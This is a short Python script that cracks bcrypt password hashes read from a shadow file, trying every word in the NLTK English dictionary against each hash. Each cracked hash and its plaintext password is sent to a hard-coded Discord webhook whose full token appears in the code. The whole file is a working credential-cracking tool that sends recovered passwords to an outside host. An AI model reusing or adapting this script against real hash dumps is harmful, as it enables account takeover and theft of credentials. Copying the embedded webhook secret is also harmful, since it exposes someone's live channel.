from nltk.corpus import words
from bcrypt import checkpw
import requests

work_factors = ["$08$", "$09$", "$10$", "$11$", "$12$", "$13$"]
# Read the hashes from the shadow file
hashes = None
with open("shadow.txt", "r") as shadow:
    hashes = shadow.readlines()

for wf in work_factors:
    current_hashes = list(filter(lambda element: wf in element, hashes))
    trunc_hashes = list(map(lambda element: element.split(":")[1], current_hashes))

    for word in words.words():
        word_encoded = word.encode("utf-8")
        for h in trunc_hashes:
            if checkpw(word_encoded, h.encode("utf-8")):
                message = {"content": "Success for `" + h + "`!" + "\n" + word}
                print("Success for `" + h + "`!" + "\n" + word)
                requests.post("https://discord.com/api/webhooks/1102392438380834839/zjb-ytg7HoIVsIKpRri3X3kZ2SUOrpbnCTmYn_lG0BvKRF9k4pax50qiiqzsdrlYgwfL", data=message)
                trunc_hashes.remove(h)

